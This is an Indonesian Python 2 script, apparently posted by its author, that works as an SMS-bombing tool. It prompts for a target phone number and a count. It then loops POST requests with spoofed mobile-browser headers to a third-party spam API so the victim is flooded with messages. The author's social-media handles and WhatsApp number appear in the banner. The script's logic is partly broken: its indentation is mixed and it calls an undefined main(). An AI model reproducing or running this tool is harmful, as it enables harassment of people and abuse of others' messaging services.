import os,sys,time,requests
from time import sleep
def nanya():
    a = raw_input("\033[1;90m[\033[1;96m?] \033[1;95mMau Spam Lagih? \033[1;90m[\033[1;96mY\033[1;91m/\033[1;96mT\033[1;90m] \033[1;91m: \033[1;93m")
    if a =="" or a ==" " or a =="  ":
	auto("Jangan Kosong Stah")
    elif a =="Y" or a =="y":
	os.system("python2 spamsms.py")
    elif a =="T" or a =="t":
	auto("\033[1;0mTerima kasih sudah menggunakan tools ini \033[1;91m:\033[1;0m)")
	sleep(1)
	auto("\033[1;96mCode By Rendi Noober")
	sys.exit()
    else:
	mengetik("Salah, masukan input dengan benar!")
	sleep(1)
	nanya()

def auto(z):
	for e in z +'\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)

os.system("clear")
logo = """
\033[1;96m+\033[1;93m-------------------------------------------------\033[1;96m+
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mAuthor    \033[1;92m  : \033[1;96mRandiansyah
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mFacebook  \033[1;92m  :\033[1;96m Rendi Saputra
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mYoutube   \033[1;92m  :\033[1;96m Rendi Noober
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mInstagtam\033[1;92m   : \033[1;96m@rendi_noober01
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mGithub    \033[1;92m  : \033[1;96mhttps://github.com/Rendi-ID
\033[1;90m[\033[1;95m+\033[1;90m]\033[1;91m WhatsApp \033[1;92m   : \033[1;96m+62 899-8941-4141
\033[1;90m[\033[1;95m+\033[1;90m] \033[1;91mJenis Tools \033[1;92m: \033[1;96mSpam Sms
\033[1;96m+\033[1;93m-------------------------------------------------\033[1;96m+"""
print logo
print "\033[1;90m[\033[1;95m+\033[1;90m] \033[1;96mExample\033[1;90m ~\033[1;91m+\033[1;96m> \033[1;95m62899********"
nomor = raw_input("\033[1;90m[\033[1;93m+\033[1;90m] \033[1;92mMasukan Nomor Si Puyuh \033[1;90m~\033[1;94m> \033[1;96m")
jumlah = raw_input("\033[90m[\033[1;93m+\033[1;90m] \033[1;92mjumlah spam untuk spam si puyuh \033[1;90m~\033[1;94m> \033[96m")
if nomor =="" or nomor ==" ":
    auto("Jangan sampe kosong stah :)")
    time.sleep(1)
    os.system("python2 spamsms.py")
elif jumlah =="" or jumlah ==" ":
    auto("Jangan sampe kosong stah :)")
    time.sleep(1)
    os.system("python2 spamsms.py")
url = 'https://nabil.my.id/api/ayosrcspam'
r = requests.Session()
head = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Ayo_Src_Bom', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
data = {'nomor':nomor,'jumlah':jumlah,'delay':'1000'}
a = 0
try:
    for i in range(int(jumlah)):
	a += 1
	x = requests.post(url, headers=head, data=data).text
	if "Success" in str(x):
	    print "\033[1;90m[\033[1;95m+\036[1;90m] \033[1;96mBerhasil Mengirim Message Ke Nomor \033[1;90m~\033[1;91m+\033[1;93m> \033[1;92m"+nomor
        elif "Gagal" in str(x):
	    print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
except:
    print "Periksa koneksi"
nanya()
print "Selesai"
main()


